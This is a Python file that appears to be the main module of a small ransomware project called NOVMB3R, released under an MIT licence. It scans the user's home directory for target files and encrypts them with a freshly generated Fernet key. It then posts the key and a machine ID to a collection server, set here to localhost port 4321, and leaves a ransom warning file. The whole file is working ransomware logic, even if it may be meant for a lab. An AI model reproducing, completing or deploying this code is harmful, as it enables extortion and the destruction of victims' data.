#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# Copyright (c) 2024-2025 Daniel Lima
#
# Licensed under the MIT License.
# See the LICENSE file in the project root for full license text.

from pathlib import Path

from cryptography.fernet import Fernet

from encrypter import Encrypter
from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
from utils import gen_machine_id, save_warning_text, send_key

SERVER_HOST = "localhost"
PORT = 4321

KEY = Fernet.generate_key()
fernet = Fernet(KEY)
MACHINE_ID = gen_machine_id()


def run(target: Path | None = None):

    target_path = Path.home() if not target else target

    files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)

    print(f"Found {len(files)} files")

    enc = Encrypter(files, fernet)

    enc.encrypt()

    send_key(f"http://{SERVER_HOST}:{PORT}", KEY, MACHINE_ID)

    save_warning_text(MACHINE_ID)
